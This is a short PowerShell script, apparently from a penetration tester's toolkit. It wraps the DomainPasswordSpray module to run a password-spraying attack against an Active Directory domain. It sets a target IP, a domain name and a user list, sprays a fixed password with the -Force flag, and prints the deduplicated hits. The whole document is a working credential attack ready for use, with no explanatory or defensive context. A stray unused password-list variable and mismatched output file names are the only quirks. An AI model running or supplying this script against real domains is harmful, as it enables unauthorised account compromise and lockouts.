
<#

1) Set Variables

$global:target="192.168.80.50"
$global:domain = "SECURE.local"
$global:userlist = "users.txt"
#

2) run the script 

./brute_domainpasswordspray.ps1

#>


$global:target=$args[0]



function run-domainpassspray {

Import-Module .\DomainPasswordSpray.ps1


# Custom Password List 
$passlist = "pass100.txt"

date 

del domainpassspray_brute_password.txt

# pasword 
Invoke-DomainPasswordSpray -UserList $userlist -Password password -Force -OutFile domainpassspray_password_brute.txt
date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content domainpassspray_password_brute.txt | sort-object| Get-Unique
}


run-domainpassspray 




